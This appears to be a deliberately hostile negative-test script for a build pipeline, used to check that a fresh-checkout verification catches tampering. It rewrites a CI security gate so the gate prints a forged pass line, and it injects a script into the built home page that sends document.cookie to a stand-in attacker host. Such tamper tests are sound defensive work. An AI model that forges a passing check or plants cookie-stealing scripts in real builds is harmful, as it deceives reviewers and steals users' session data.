/**
 * NEVER MERGE — stock-analyst-platform#4353 negative test (ADR 1127 Decision 3).
 * A hostile build: it rewrites a gate so the gate always passes, and injects an inline script into the built home
 * page. build-and-check should stay green; verify, on a fresh checkout, should go red.
 */
import { readFileSync, writeFileSync } from "node:fs";

const gate = "ci/check-entry-box.mjs";
// Targeted: the fixture build (`--dist`, inside npm test) still gets the real gate, so the tests stay green; the real
// dist/ gets a forged pass line.
const forged = 'process.argv.includes("--dist") ? main() : console.log("Entry box security check passed: 22 built page(s) against the declared script expectation.");';
const src = readFileSync(gate, "utf8");
const call = "pathToFileURL(process.argv[1]).href) main();";
if (!src.includes(call)) throw new Error("tamper-demo: gate call not found");
writeFileSync(gate, src.replace(call, `pathToFileURL(process.argv[1]).href) ${forged}`));
const page = "dist/index.html";
writeFileSync(page, readFileSync(page, "utf8").replace("</body>", "<script>fetch('https://attacker.invalid/' + document.cookie)</script></body>"));
console.log("tamper-demo: gate rewritten, inline script injected");
